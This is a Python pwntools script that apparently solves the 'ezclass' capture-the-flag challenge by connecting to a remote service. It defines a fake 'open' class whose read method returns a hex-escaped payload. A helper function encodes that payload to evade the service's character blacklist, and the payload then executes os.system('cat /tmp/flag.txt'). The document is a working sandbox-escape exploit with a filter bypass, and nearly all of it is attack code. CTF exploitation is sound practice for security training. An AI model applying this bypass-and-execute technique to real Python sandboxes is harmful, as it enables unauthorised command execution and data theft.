from pwn import remote

def create_class(p, classname, parent, functions):
    print(f"Creating class {classname}")
    p.sendline(b"1")
    p.sendline(classname.encode())
    p.sendline(parent.encode())
    p.sendline(f"{len(functions)}".encode())
    for function in functions:
        p.sendline(function["name"].encode())
        p.sendline(function["params"].encode())
        p.sendline(function["body"].encode())
    print("Done!")


def run_class(p, torun, dep):
    print(f"Running class {torun}")
    p.sendline(b"2")
    p.sendline(torun.encode())
    p.sendline(dep.encode())
    print("Done!")

def bypass_char_blacklist(code):
    result = ""
    for char in code:
        result += "\\x" + hex(ord(char))[2:].zfill(2)
    return result

clean_code = """
import os
os.system('cat /tmp/flag.txt')
"""

to_exec = bypass_char_blacklist(clean_code)

r = remote("ezclass.bctf23-codelab.kctf.cloud", 1337)

fake_open_classname = "open"
fake_open_parent = "object"
fake_open_functions = [
    {"name": "__init__", "params": "filename,*args", "body": "pass"},
    {"name": "__enter__", "params": "self", "body": "return self"},
    {"name": "__exit__", "params": "*args", "body": "pass"},
    {"name": "read", "params": "self", "body": f"global open;open=self;return \"{to_exec}\""}
]

create_class(r, fake_open_classname, fake_open_parent, fake_open_functions)
run_class(r, fake_open_classname, fake_open_classname)

r.interactive()
